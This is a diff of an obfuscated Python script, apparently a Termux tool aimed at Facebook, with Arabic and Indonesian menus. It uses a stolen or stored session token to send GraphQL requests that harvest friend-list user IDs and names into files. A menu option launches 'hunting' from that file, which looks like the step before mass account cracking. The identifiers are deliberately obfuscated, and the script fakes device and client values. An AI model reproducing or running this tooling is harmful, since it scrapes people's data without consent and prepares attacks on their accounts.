-				print (f" [•] PASTE UID ONE BY ONE ");IIlllIlIIlIIIllll ()
-				while _IllIllIlIIIlIIIII :
-					IlIIlIIlIIIlllllI =input (f" [>] ENTER UID : ")
-					if IlIIlIIlIIIlllllI =='':IIlllIlIIlIIIllll ();print (f" [•] FILE SAVE AS : {IlIIllllllIIIlIll} ");input (f" [>] PRESS ENTER TO BACK ");IIlIlIllIllIlIlIl ();break 
-					try :IIIIIIIllllIIIlIl =IlIIlIIlIIIlllllI .split (_IIIIIIIlIIIlIIlIl )[0 ]
-					except :IIIIIIIllllIIIlIl =IlIIlIIlIIIlllllI 
-					try :
-						IllIIIlIIIIlllIIl ={_IllIlIlIIIIIIIlll :_IIIlIllllllIIllII ,_IIlIIIIIllIlllIII :_IIIlIlllllIIIIIII ,_IIIllllIIIlIlllII :_IIlIIIIllllllIIIl ,_IIlllIlllllIIIIIl :_IIllIIlIllllIlIIl ,_IIIIIIlIlllllIIlI :_IlIIlIIlIlllllIlI ,_IlllIIllIlIIIlIII :_IlIIlIIlIlllllIlI ,_IIlIIllIllIllllll :_IlIlIllllIIIlIIlI +IIIIllllIIIIIIlll .token +'',_IlIIIIIIIIIIIIllI :_IIllIllIllIIllIlI ,_IlIIIlIIIlllIllIl :_IIlIIlllllIllIIll ,_IIllllllIlllIIIII :_IlllIIIlIIlIIlIll ,_IIllIIIlIIllllIll :_IIIlllIIIIllllIll ,_IIIlllIllIIIIIIIl :_IlIlllIllIIIlIIll ,_IlIllllllIIllIIII :f"graphql:{IlIIllIIIllIlIIlI}",_IIIIlIIlIlIllIlII :_IlIIllIllIIIllllI ,_IlllIIlllllIIIllI :_IIIlIllllllIIllII ,_IllIllIlllIIIIIIl :'u=0',_IlIlIIIIIIIlllIII :_IIIlllIIIlllllIll ,_IllIlIIllIllIIIIl :_IIllIllIIlllIIIlI ,_IIllIlllIIlIlIlll :_IllIllIIIlIlIIlll ,_IIlIlIlIllIIllIlI :_IllIllIIIlIlIIlll ,_IlIIllIlIIIlIlIlI :_IllIlIlllllIIIllI ,_IIIlIlllllIIlIIlI :_IIIlIIlIlIlllIIlI ,_IllIlIIIIlIIIllll :'567'};IlIllllllIllIllll ={_IIIIllIlllIIIIIIl :_IIIIllIlIlllIIllI +IlIlIIIllIIIlIIII +_IllIlllllIlIlIlIl +IlllIIlIllIllIIIl +_IIlIIlllIIIIlIIll +IlllIIlIllIllIIIl +_IIlIllIlIIIlIIIll +IIIIlIIllIIlIlIll +_IIIIlIIIllllIIIlI ,_IIlllIlIllIIIIllI :IlIlllIlIIlIlIIIl ,_IlllIlIIllIIllIll :_IIIlIIlllIlIIIIll ,_IIlIllIIIIIIIllll :_IllIlIIlllllllllI ,_IlIlIllIIIIlllIlI :_IIlIlIlIIIlllIlIl ,_IlIlIIlllllllIIll :_IllIIIlIllIIlllII ,_IlIIlIIlllIIIlIII :_IIlIIIIIllllIlIlI +IIIIIIIllllIIIlIl +_IllIIlIIlIllIlIll ,_IlIIlIIlIIllIlIII :_IlIIllIllIIIllllI ,_IIIIllllIIlIllllI :_IIIlIllllllIIllII ,_IllIIIIIIlllllIII :_IlIIlIIIlIllllIll ,_IlIIIIIIlIIlIIIlI :IlIIllIIIllIlIIlI ,_IIIIllIlIlIlIlIlI :_IIllIIllIllIlIIII ,_IIIlIlIIIlIlIIIlI :_IIIlIlllllIIIIIII };IIIIlllllIllIlIIl =requests .post (_IIlllIlIlIlIlIlIl ,headers =IllIIIlIIIIlllIIl ,data =IlIllllllIllIllll ).json ()
-						try :IlIllllllIllIllll =IIIIlllllIllIlIIl [_IlIlIIlIIlIlIIlIl ][_IIIlIllIIllIlIIll ][_IIIIllllllllllIIl ][_IllIIlllIIIllllIl ]
-						except :print (f" [1;35m SOMETHING WRONG WITH {IIIIIIIllllIIIlIl}[0m ")
-						if len (IlIllllllIllIllll )<100 :print (f" [×] PRIVATE FRIENDLIST OF {IIIIIIIllllIIIlIl} ");IIlllIlIIlIIIllll ()
-						else :
-							for IllIIlIlllIIllIll in IlIllllllIllIllll :IllIIlllIlIlIlIIl =IllIIlIlllIIllIll ['node'];open (IlIIllllllIIIlIll ,_IIllIlllIIIIIlIlI ,encoding =_IIllIlIlllIIIlIlI ).write (IllIIlllIlIlIlIIl ['id']+_IIIIIIIlIIIlIIlIl +IllIIlllIlIlIlIIl [_IlllllIIIIIllIIlI ]+_IlIlIllllIIlIIllI )
-							try :IIlIlIllllIIIIlll =len (open (IlIIllllllIIIlIll ,_IIllIlIlIlIlIIllI ).readlines ())
-							except :IIlIlIllllIIIIlll =_IIIIIllllIlIlIIII 
-							print (f" [•] SUCESSFULLY EXTRACTED {IIIIIIIllllIIIlIl} [{IIlIlIllllIIIIlll}] [0m");IIlllIlIIlIIIllll ()
-					except KeyError :pass 
-					except requests .exceptions .ConnectionError :input (f" [×] CINNECTIIN ERROR - PRESS ENTER TO CONTINUE")
-		def __init__ (IIIIIllIIIlllIlII ):
-			try :print ('')
-			except :pass 
-			IIIIIllIIIlllIlII .ids =[];IIIIIllIIIlllIlII .total =[];IIIIIllIIIlllIlII .loop =0 
-			try :
-				IIIIIllIIIlllIlII .token =open (_IllIIIIlllllIlIII ,_IIllIlIlIlIlIIllI ).read ();IlIIlIIlIIlIIllII ='1lll6168976l374'
-				try :
-					IllIlIIlllIlIlIII ={_IllIlIlIIIIIIIlll :_IIIlIllllllIIllII ,_IIlIIIIIllIlllIII :_IIIlIlllllIIIIIII ,_IIIllllIIIlIlllII :_IIlIIIIllllllIIIl ,_IIlllIlllllIIIIIl :_IIllIIlIllllIlIIl ,_IIIIIIlIlllllIIlI :_IlIIlIIlIlllllIlI ,_IlllIIllIlIIIlIII :_IlIIlIIlIlllllIlI ,_IIlIIllIllIllllll :_IlIlIllllIIIlIIlI +IIIIIllIIIlllIlII .token +'',_IlIIIIIIIIIIIIllI :_IIllIllIllIIllIlI ,_IlIIIlIIIlllIllIl :_IIlIIlllllIllIIll ,_IIllllllIlllIIIII :_IlllIIIlIIlIIlIll ,_IIllIIIlIIllllIll :_IIIlllIIIIllllIll ,_IIIlllIllIIIIIIIl :_IlIlllIllIIIlIIll ,_IlIllllllIIllIIII :f"graphql:{IlIIllIIIllIlIIlI}",_IIIIlIIlIlIllIlII :_IlIIllIllIIIllllI ,_IlllIIlllllIIIllI :_IIIlIllllllIIllII ,_IllIllIlllIIIIIIl :'u=0',_IlIlIIIIIIIlllIII :_IIIlllIIIlllllIll ,_IllIlIIllIllIIIIl :_IIllIllIIlllIIIlI ,_IIllIlllIIlIlIlll :_IllIllIIIlIlIIlll ,_IIlIlIlIllIIllIlI :_IllIllIIIlIlIIlll ,_IlIIllIlIIIlIlIlI :_IllIlIlllllIIIllI ,_IIIlIlllllIIlIIlI :_IIIlIIlIlIlllIIlI ,_IllIlIIIIlIIIllll :'567'};IlIIlIllIIIIlIlII ={_IIIIllIlllIIIIIIl :_IIIIllIlIlllIIllI +IlIlIIIllIIIlIIII +_IllIlllllIlIlIlIl +IlllIIlIllIllIIIl +_IIlIIlllIIIIlIIll +IlllIIlIllIllIIIl +_IIlIllIlIIIlIIIll +IIIIlIIllIIlIlIll +_IIIIlIIIllllIIIlI ,_IIlllIlIllIIIIllI :IlIlllIlIIlIlIIIl ,_IlllIlIIllIIllIll :_IIIlIIlllIlIIIIll ,_IIlIllIIIIIIIllll :_IllIlIIlllllllllI ,_IlIlIllIIIIlllIlI :_IIlIlIlIIIlllIlIl ,_IlIlIIlllllllIIll :_IllIIIlIllIIlllII ,_IlIIlIIlllIIIlIII :_IIlIIIIIllllIlIlI +IlIIlIIlIIlIIllII +_IllIIlIIlIllIlIll ,_IlIIlIIlIIllIlIII :_IlIIllIllIIIllllI ,_IIIIllllIIlIllllI :_IIIlIllllllIIllII ,_IllIIIIIIlllllIII :_IlIIlIIIlIllllIll ,_IlIIIIIIlIIlIIIlI :IlIIllIIIllIlIIlI ,_IIIIllIlIlIlIlIlI :_IIllIIllIllIlIIII ,_IIIlIlIIIlIlIIIlI :_IIIlIlllllIIIIIII };IIllllllIIIIlIIII =requests .post (_IIlllIlIlIlIlIlIl ,headers =IllIlIIlllIlIlIII ,data =IlIIlIllIIIIlIlII ).json ()
-					if not IIllllllIIIIlIIII [_IlIlIIlIIlIlIIlIl ][_IIIlIllIIllIlIIll ][_IIIIllllllllllIIl ][_IllIIlllIIIllllIl ]:os .system (_IlIIlllIIlIIllIlI );print (logo );os .system (_IllIIIIlllllIlIII )
-					try :IlIIlIllIIIIlIlII =IIllllllIIIIlIIII [_IlIlIIlIIlIlIIlIl ][_IIIlIllIIllIlIIll ][_IIIIllllllllllIIl ][_IllIIlllIIIllllIl ]
-					except :print (f" [1;31m SOMETHING WRONG WITH THIS ID [0m ");os .system (_IllIIIIlllllIlIII );exit ()
-				except Exception as IlllIIlIlIIlIIlll :os .system (_IlIIlllIIlIIllIlI );print (logo );print (f" [{IIIlllllIIlllIIIl}×{IIlIIIIIlIlIIIIII}] COOKIES EXPRIED !");print (IlllIIlIlIIlIIlll );IIIIlIlIIIllIlllI .login_WALA ('')
-			except Exception as IlllIIlIlIIlIIlll :print (IlllIIlIlIIlIIlll );IIIIlIlIIIllIlllI .login_WALA ('')
-		def file_unlimmited (IlIIlIllIIllllllI ):
-			IllIIlIIlIlIllllI ='.a.txt';os .system (_IlIIlllIIlIIllIlI );from pyfiglet import Figlet as F ;from random import choice as c ;print ('\x1b[92m'+F (c (['slant'])).renderText ('SDM1'));print ('•'*60 );IIlIIIlIIlIIIlIIl =int (_IIllIIlIllllIlIIl )
-			try :print (f"Enter The File Name √ \n\n Exemple : Besto.txt ♕ اكتب اسم الملف ");IIIIIllIllllIlIll =input (f"[1;32m[[1;37m•[1;32m] Enter The File Name :").replace (' ','_');IIllIIlIIIIlllIIl ='/sdcard/';IIIllIIllIlIIlllI ='%s%s'%(IIllIIlIIIIlllIIl ,IIIIIllIllllIlIll );open (IIIllIIllIlIIlllI ,'w')
-			except FileNotFoundError :print (f"ENER THE FILE NAME WITH (.txt) ");time .sleep (1 );IIlIlIllIllIlIlIl ()
-			except IsADirectoryError :time .sleep (1 );IlIllllIIIlIllIll ().file_simple ()
-			if IOError :
-				os .system (_IlIIlllIIlIIllIlI )
-				try :IllllIIlIIIIIIllI =open ('.temp.txt',_IIllIlIlIlIlIIllI ).read ().splitlines ()
-				except :IllllIIlIIIIIIllI =[]
-				os .system (_IlIIlllIIlIIllIlI );print (IIIIIIIIIIIllIlII );print (f"{IIIIlIIllllIIlllI}—"*60 )
-				for IllIIIIlllIlIlIIl in range (int (IIlIIIlIIlIIIlIIl )):
-					IlIIIllllIIlIIIIl =input (f" - Enter ID :".format (IllIIIIlllIlIlIIl +1 ))
-					try :
-						IlIIIIIIIllIIllll ={_IllIlIlIIIIIIIlll :_IIIlIllllllIIllII ,_IIlIIIIIllIlllIII :_IIIlIlllllIIIIIII ,_IIIllllIIIlIlllII :_IIlIIIIllllllIIIl ,_IIlllIlllllIIIIIl :_IIllIIlIllllIlIIl ,_IIIIIIlIlllllIIlI :_IlIIlIIlIlllllIlI ,_IlllIIllIlIIIlIII :_IlIIlIIlIlllllIlI ,_IIlIIllIllIllllll :_IlIlIllllIIIlIIlI +IlIIlIllIIllllllI .token +'',_IlIIIIIIIIIIIIllI :_IIllIllIllIIllIlI ,_IlIIIlIIIlllIllIl :_IIlIIlllllIllIIll ,_IIllllllIlllIIIII :_IlllIIIlIIlIIlIll ,_IIllIIIlIIllllIll :_IIIlllIIIIllllIll ,_IIIlllIllIIIIIIIl :_IlIlllIllIIIlIIll ,_IlIllllllIIllIIII :f"graphql:{IlIIllIIIllIlIIlI}",_IIIIlIIlIlIllIlII :_IlIIllIllIIIllllI ,_IlllIIlllllIIIllI :_IIIlIllllllIIllII ,_IllIllIlllIIIIIIl :'u=0',_IlIlIIIIIIIlllIII :_IIIlllIIIlllllIll ,_IllIlIIllIllIIIIl :_IIllIllIIlllIIIlI ,_IIllIlllIIlIlIlll :_IllIllIIIlIlIIlll ,_IIlIlIlIllIIllIlI :_IllIllIIIlIlIIlll ,_IlIIllIlIIIlIlIlI :_IllIlIlllllIIIllI ,_IIIlIlllllIIlIIlI :_IIIlIIlIlIlllIIlI ,_IllIlIIIIlIIIllll :'567'};IIlIIlllIIlllIlIl ={_IIIIllIlllIIIIIIl :_IIIIllIlIlllIIllI +IlIlIIIllIIIlIIII +_IllIlllllIlIlIlIl +IlllIIlIllIllIIIl +_IIlIIlllIIIIlIIll +IlllIIlIllIllIIIl +_IIlIllIlIIIlIIIll +IIIIlIIllIIlIlIll +_IIIIlIIIllllIIIlI ,_IIlllIlIllIIIIllI :IlIlllIlIIlIlIIIl ,_IlllIlIIllIIllIll :_IIIlIIlllIlIIIIll ,_IIlIllIIIIIIIllll :_IllIlIIlllllllllI ,_IlIlIllIIIIlllIlI :_IIlIlIlIIIlllIlIl ,_IlIlIIlllllllIIll :_IllIIIlIllIIlllII ,_IlIIlIIlllIIIlIII :_IIlIIIIIllllIlIlI +IlIIIllllIIlIIIIl +_IllIIlIIlIllIlIll ,_IlIIlIIlIIllIlIII :_IlIIllIllIIIllllI ,_IIIIllllIIlIllllI :_IIIlIllllllIIllII ,_IllIIIIIIlllllIII :_IlIIlIIIlIllllIll ,_IlIIIIIIlIIlIIIlI :IlIIllIIIllIlIIlI ,_IIIIllIlIlIlIlIlI :_IIllIIllIllIlIIII ,_IIIlIlIIIlIlIIIlI :_IIIlIlllllIIIIIII };IIllIIIlIIllIlIll =requests .post (_IIlllIlIlIlIlIlIl ,headers =IlIIIIIIIllIIllll ,data =IIlIIlllIIlllIlIl ).json ()
-						try :IIlIIlllIIlllIlIl =IIllIIIlIIllIlIll [_IlIlIIlIIlIlIIlIl ][_IIIlIllIIllIlIIll ][_IIIIllllllllllIIl ][_IllIIlllIIIllllIl ]
-						except :print (f"")
-						if len (IIlIIlllIIlllIlIl )<100 :print ('')
-						else :
-							for IIlIIIlllIlIIIIII in IIlIIlllIIlllIlIl :IIIllIlIlIllIIlIl =IIlIIIlllIlIIIIII ['node'];open (IllIIlIIlIlIllllI ,_IIllIlllIIIIIlIlI ,encoding =_IIllIlIlllIIIlIlI ).write (IIIllIlIlIllIIlIl ['id']+_IlIlIllllIIlIIllI );IIIIllIIIIIlllIlI =len (open (IllIIlIIlIlIllllI ,_IIllIlIlIlIlIIllI ).readlines ())
-							print (f"[{IIIIllIIIIIlllIlI}][0m")
-					except KeyError :pass 
-					except requests .exceptions .ConnectionError :input (f"YOU HAVE BAD NET PRESS ENTER:")
-				try :IllllIIlIIIIIIllI =open (IllIIlIIlIlIllllI ,_IIllIlIlIlIlIIllI ).read ().splitlines ()
-				except :IllllIIlIIIIIIllI =[]
-				os .system (_IlIIlllIIlIIllIlI );print (IIIIIIIIIIIllIlII );print (f"{IIIIlIIllllIIlllI}—"*60 );print (f"{IlIlIIIIIlllllIIl} [1;94m[[1;97m√[1;94m][1;94m [1;97m You Have "+str (len (IllllIIlIIIIIIllI ))+' Ids');IIlllIlIIlIIIllll ()
-				for IlIIIllllIIlIIIIl in IllllIIlIIIIIIllI :
-					try :
-						IlIIIIIIIllIIllll ={_IllIlIlIIIIIIIlll :_IIIlIllllllIIllII ,_IIlIIIIIllIlllIII :_IIIlIlllllIIIIIII ,_IIIllllIIIlIlllII :_IIlIIIIllllllIIIl ,_IIlllIlllllIIIIIl :_IIllIIlIllllIlIIl ,_IIIIIIlIlllllIIlI :_IlIIlIIlIlllllIlI ,_IlllIIllIlIIIlIII :_IlIIlIIlIlllllIlI ,_IIlIIllIllIllllll :_IlIlIllllIIIlIIlI +IlIIlIllIIllllllI .token +'',_IlIIIIIIIIIIIIllI :_IIllIllIllIIllIlI ,_IlIIIlIIIlllIllIl :_IIlIIlllllIllIIll ,_IIllllllIlllIIIII :_IlllIIIlIIlIIlIll ,_IIllIIIlIIllllIll :_IIIlllIIIIllllIll ,_IIIlllIllIIIIIIIl :_IlIlllIllIIIlIIll ,_IlIllllllIIllIIII :f"graphql:{IlIIllIIIllIlIIlI}",_IIIIlIIlIlIllIlII :_IlIIllIllIIIllllI ,_IlllIIlllllIIIllI :_IIIlIllllllIIllII ,_IllIllIlllIIIIIIl :'u=0',_IlIlIIIIIIIlllIII :_IIIlllIIIlllllIll ,_IllIlIIllIllIIIIl :_IIllIllIIlllIIIlI ,_IIllIlllIIlIlIlll :_IllIllIIIlIlIIlll ,_IIlIlIlIllIIllIlI :_IllIllIIIlIlIIlll ,_IlIIllIlIIIlIlIlI :_IllIlIlllllIIIllI ,_IIIlIlllllIIlIIlI :_IIIlIIlIlIlllIIlI ,_IllIlIIIIlIIIllll :'567'};IIlIIlllIIlllIlIl ={_IIIIllIlllIIIIIIl :_IIIIllIlIlllIIllI +IlIlIIIllIIIlIIII +_IllIlllllIlIlIlIl +IlllIIlIllIllIIIl +_IIlIIlllIIIIlIIll +IlllIIlIllIllIIIl +_IIlIllIlIIIlIIIll +IIIIlIIllIIlIlIll +_IIIIlIIIllllIIIlI ,_IIlllIlIllIIIIllI :IlIlllIlIIlIlIIIl ,_IlllIlIIllIIllIll :_IIIlIIlllIlIIIIll ,_IIlIllIIIIIIIllll :_IllIlIIlllllllllI ,_IlIlIllIIIIlllIlI :_IIlIlIlIIIlllIlIl ,_IlIlIIlllllllIIll :_IllIIIlIllIIlllII ,_IlIIlIIlllIIIlIII :_IIlIIIIIllllIlIlI +IlIIIllllIIlIIIIl +_IllIIlIIlIllIlIll ,_IlIIlIIlIIllIlIII :_IlIIllIllIIIllllI ,_IIIIllllIIlIllllI :_IIIlIllllllIIllII ,_IllIIIIIIlllllIII :_IlIIlIIIlIllllIll ,_IlIIIIIIlIIlIIIlI :IlIIllIIIllIlIIlI ,_IIIIllIlIlIlIlIlI :_IIllIIllIllIlIIII ,_IIIlIlIIIlIlIIIlI :_IIIlIlllllIIIIIII };IIllIIIlIIllIlIll =requests .post (_IIlllIlIlIlIlIlIl ,headers =IlIIIIIIIllIIllll ,data =IIlIIlllIIlllIlIl ).json ()
-						try :IIlIIlllIIlllIlIl =IIllIIIlIIllIlIll [_IlIlIIlIIlIlIIlIl ][_IIIlIllIIllIlIIll ][_IIIIllllllllllIIl ][_IllIIlllIIIllllIl ]
-						except :continue 
-						if len (IIlIIlllIIlllIlIl )<100 :continue 
-						else :
-							for IIlIIIlllIlIIIIII in IIlIIlllIIlllIlIl :IIIllIlIlIllIIlIl =IIlIIIlllIlIIIIII ['node'];open (IIIllIIllIlIIlllI ,_IIllIlllIIIIIlIlI ,encoding =_IIllIlIlllIIIlIlI ).write (IIIllIlIlIllIIlIl ['id']+_IIIIIIIlIIIlIIlIl +IIIllIlIlIllIIlIl [_IlllllIIIIIllIIlI ]+_IlIlIllllIIlIIllI )
-							if 'y'in IIlIlIIlIIlIlIlII :perfector (IIIllIIllIlIIlllI )
-							try :IIIlIIIIIlIllIlll =len (open (IIIllIIllIlIIlllI ,_IIllIlIlIlIlIIllI ).readlines ())
-							except :IIIlIIIIIlIllIlll =_IIIIIllllIlIlIIII 
-							print (f"{IlIlIIIIIlllllIIl} [1;94m[[1;97m√[1;94m][1;94m [1;97m Id Coolected  ➩ {IIIlIIIIIlIllIlll}) ")
-					except KeyError :pass 
-					except requests .exceptions .ConnectionError :continue 
-				print ('DONE'.format (IIIllIIllIlIIlllI ));print ('M_T_F'.format (len (open (IIIllIIllIlIIlllI ,_IIllIlIlIlIlIIllI ).read ().splitlines ())))
-	IIIIIIIllIIIIlllI ()
-elif IlllIllIllIIIIIII =='2':import requests ,bs4 ,json ,os ,sys ,random ,datetime ,time ,re 
-import requests ,bs4 ,json ,os ,sys ,random ,datetime ,time ,re ,urllib3 ,rich ,base64 
-from time import sleep 
-from rich .table import Table as me 
-from rich .console import Console as sol 
-from bs4 import BeautifulSoup as sop 
-from bs4 import BeautifulSoup as parser 
-from concurrent .futures import ThreadPoolExecutor as tred 
-from rich .console import Group as gp 
-from rich .panel import Panel as nel 
-from rich import print as cetak 
-from rich .markdown import Markdown as mark 
-from rich .columns import Columns as col 
-from rich import print as rprint 
-from rich import pretty 
-from rich .text import Text as tekz 
-import os ,webbrowser 
-webbrowser .open ('')
-from datetime import *
-try :import rich 
-except ImportError :cetak (nel ('\t• Sedang Menginstall Modul Rich •'));os .system (_IIllllIlllIIIllII )
-try :import stdiomask 
-except ImportError :cetak (nel ('\t• Sedang Menginstall Modul Stdiomask •'));os .system (_IIIlIIIlllllIIlII )
-try :import requests 
-except ImportError :IlllIlIllllIllIII =_IlIlIIIIlllIlIIlI 
-IlIIIIIIllIIIIIIl =_IlIlIIIIlllIlIIlI 
-IllIIIllllIllIIlI =_IlIIIllIllIlIllll 
-IIllllIllllllIIlI =_IlllIllIIIIIlIIIl 
-IllllllIlIIllIlII =_IlllllIIlIlIlIIII 
-IIIlllllIIlllIIIl =_IIlIIIIIIlIlIllII 
-IllIlIIllIlIllIlI =_IllIIIlIIllIlllII 
-IllIlIIIIIlllIlII =_IlIlIIIIlllIlIIlI 
-IIIlllllIIlllIIIl =_IIlIIIIIIlIlIllII 
-IIIllIIlIllllIIll =_IllllIlIIIIlllIll 
-IlIlllllIIllIIIll =_IlIIIllIllIlIllll 
-import requests ,bs4 ,json ,os ,sys ,random ,datetime ,time ,re ,urllib3 ,rich ,base64 
-from time import sleep 
-from rich .table import Table as me 
-from rich .console import Console as sol 
-from bs4 import BeautifulSoup as sop 
-from bs4 import BeautifulSoup as parser 
-from concurrent .futures import ThreadPoolExecutor as tred 
-from rich .console import Group as gp 
-from rich .panel import Panel as nel 
-from rich import print as cetak 
-from rich .markdown import Markdown as mark 
-from rich .columns import Columns as col 
-from rich import print as rprint 
-from rich import pretty 
-from rich .text import Text as tekz 
-import os 
-from rich .text import Text as tekz 
-
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from time import sleep
@@ -993,29 +413,623 @@ from rich.columns import Columns as col
 from rich import print as rprint
 from rich import pretty
 from rich.text import Text as tekz
-import random
 import os
-import sys
-import time
-import os,sys,time,json,random,re,string,platform,base64
-#mport requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-import os
+import webbrowser
+webbrowser.open('')
+from datetime import *
+import requests
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أزرق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;153m'  # أخضر فاتح
+print(SDMVIP) 
+print('')
+print('\x1b[38;5;153m━━'*30)
+print('\x1b[38;5;153m━━'*30)
+print('\x1b[1;38m[1]  - صـنـع مــلــف ايـديـات')
+print(a3+'=='*30)
+print('\x1b[1;38m[2]  - تشـغـيل اداة صـيد من ملـف')
+print('\x1b[38;5;153m━━'*30)
+print('\x1b[38;5;153m━━'*30)
+print('')
+M_T_F=input('  𝖤𝗇𝗍𝖾𝗋 : ')
+if M_T_F== '1':
+    a1 = '\x1b[1;31m'  # أحمر
+    a2 = '\x1b[1;34m'  # أزرق
+    a3 = '\x1b[1;32m'  # أخضر
+    a4 = '\x1b[1;33m'  # أصفر
+    a5 = '\x1b[38;5;208m'  # برتقالي
+    a6 = '\x1b[38;5;5m'  # أرجواني
+    a7 = '\x1b[38;5;13m'  # وردي
+    a8 = '\x1b[1;30m'  # أسود
+    a9 = '\x1b[1;37m'  # أبيض
+    a10 = '\x1b[38;5;52m'  # بني
+    a11 = '\x1b[38;5;8m'  # رمادي
+    a12 = '\x1b[38;5;220m'  # ذهبي
+    a13 = '\x1b[38;5;7m'  # فضي
+    a14 = '\x1b[38;5;153m'  # أزرق فاتح
+    a15 = '\x1b[38;5;18m'  # أزرق داكن
+    a16 = '\x1b[38;5;153m'  # أخضر فاتح
+    a17 = '\x1b[38;5;22m'  # أخضر داكن
+    a18 = '\x1b[38;5;196m'  # أحمر فاتح
+    a19 = '\x1b[38;5;88m'  # أحمر داكن
+    a20 = '\x1b[38;5;226m'  # أصفر فاتح
+    a21 = '\x1b[38;5;136m'  # أصفر داكن
+    a22 = '\x1b[38;5;216m'  # برتقالي فات
+    a23 = '\x1b[38;5;166m'  # برتقالي داكن
+    a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+    a25 = '\x1b[38;5;91m'  # أرجواني داكن
+    a26 = '\x1b[38;5;205m'  # وردي فاتح
+    a27 = '\x1b[38;5;161m'  # وردي داكن
+    a28 = '\x1b[38;5;236m'  # أسود فاتح
+    a29 = '\x1b[38;5;233m'  # أسود داكن
+    a30 = '\x1b[38;5;255m'  # أبيض فاتح
+    a31 = '\x1b[38;5;231m'  # أبيض داكن
+    a32 = '\x1b[38;5;180m'  # بني فاتح
+    a33 = '\x1b[38;5;94m'  # بني داكن
+    a34 = '\x1b[38;5;252m'  # رمادي فاتح
+    a35 = '\x1b[38;5;246m'  # رمادي داكن
+    a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+    a37 = '\x1b[38;5;172m'  # ذهبي داكن
+    a38 = '\x1b[38;5;188m'  # فضي فاتح
+    a39 = '\x1b[38;5;247m'  # فضي داكن
+    a40 = '\x1b[38;5;117m'  # أزرق سماوي8
+    import os, re, random, uuid, subprocess, requests, sys, time, json, string
+    from os import system
+    libraries_to_install = ['random', 'uuid', 'subprocess', 'requests', 'time', 'json', 'string']
+    [exec(f"import {lib}") if lib not in sys.modules else None for lib in libraries_to_install]
+    try:
+    	import mechanize
+    	demo_folder = mechanize.Browser()
+    	demo_folder.set_handle_robots(False)
+    	demo_folder.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except:
+    	os.system('pip install mechanize')
+     
+    def M_T_F(u):
+    	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
+    def back():
+        main_menu()
+    def linex():
+    	ge0=0
+    G = "\u001b[32m"
+    B = "\u001b[36m"
+    W = "\033[1;37m"
+    pemisah = '|'
+    q="968"
+    qq="8280"
+    qqq="52729"
+    qqqq="420"
+    client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"
+    sim_hini = str(random.randint(2e4,4e4))
+    trace_id = str(uuid.uuid4())
+    try:
+    	android = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '').upper()
+    	model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '').upper()
+    	carrier = '' + subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '').upper()
+    except:
+    	android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
+    	model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
+    	carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&", "MTN", "Cricket"])
+    P = '\x1b[1;97m'
+    M = '\x1b[1;91m'
+    H = '\x1b[1;92m'
+    K = '\x1b[1;93m'
+    B = '\x1b[1;94m'
+    U = '\x1b[1;95m' 
+    O = '\x1b[1;96m'
+    N = '\x1b[0m'    
+    Z = "\033[1;30m" 
+    def find_txt_file(file_path):
+        user_dir, user_file = os.path.split(file_path)
+    
+        if os.path.exists(file_path) and file_path.lower().endswith('.txt'):
+            return file_path
+        parent_dir = os.path.dirname(user_dir)
+        for root, dirs, files in os.walk(parent_dir):
+            for name in files:
+                if name.lower() == user_file.lower() and name.lower().endswith('.txt'):
+                    corrected_path = os.path.join(root, name)
+                    return corrected_path
+    
+        return None
+	
+    class login():    	
+    
+    	def __init__(self):
+    		ids=[]
+    	def lo_epa(self):
+    		system('clear')
+    		print(a1+'''\033[1;34m
+\x1b[38;5;180m \x1b[38;5;180m 
+	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
